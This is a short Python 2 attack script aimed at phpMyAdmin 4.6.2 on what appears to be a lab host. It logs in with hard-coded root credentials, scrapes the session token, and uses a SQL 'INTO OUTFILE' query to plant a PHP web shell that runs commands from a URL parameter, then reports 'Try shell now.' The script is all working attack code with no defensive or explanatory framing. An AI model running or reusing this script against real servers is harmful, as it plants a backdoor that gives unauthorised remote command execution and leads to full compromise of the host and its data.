#!/usr/bin/env python

import urllib2, urllib, cookielib
import string

base = u'http://192.168.56.101/pma/phpMyAdmin-4.6.2-all-languages/'
query = 'select "<?php system($_GET[\'x\']);" into outfile "/var/www/html/testlink/mishell.php"'

username = 'root'
password = 'passpass'
login_params = urllib.urlencode({
        u'pma_username' : username,
        u'pma_password' : password,
        u'lang' : u'en-utf-8',
        u'convcharset' : u'utf-8',
        u'server' : u'1'
})
urllib2.install_opener(urllib2.build_opener(urllib2.HTTPCookieProcessor()))
f = urllib2.urlopen(base + u'index.php', login_params)
redirect_url = f.geturl()
token_label = "&token="
pos = string.rindex(redirect_url, token_label)
pos2 = string.index(redirect_url, '&', pos + len(token_label))
token = redirect_url[pos + len(token_label):pos2]

gotToken = token
f.close()

s = 'hi'
backup_params = urllib.urlencode({
   'is_js_confirmed' : '0',
    'token' : gotToken,
    'pos' : '0',
    'goto' : 'server_sql.php',
    'message_to_show' : 'Your+SQL+query+has+been+executed+successfully.',
    'prev_sql_query' : '',
    'sql_query' : query,
    'sql_delimiter' : ';',
    'show_query' : '1',
    'fk_checks' : '0',
    'SQL' : 'Go',
    'ajax_request' : 'true',
    'ajax_page_request' : 'true'


})
f = urllib2.urlopen(base + u'import.php', backup_params)

#print f.fp.read()
f.close()

print 'Done. Try shell now.'
 
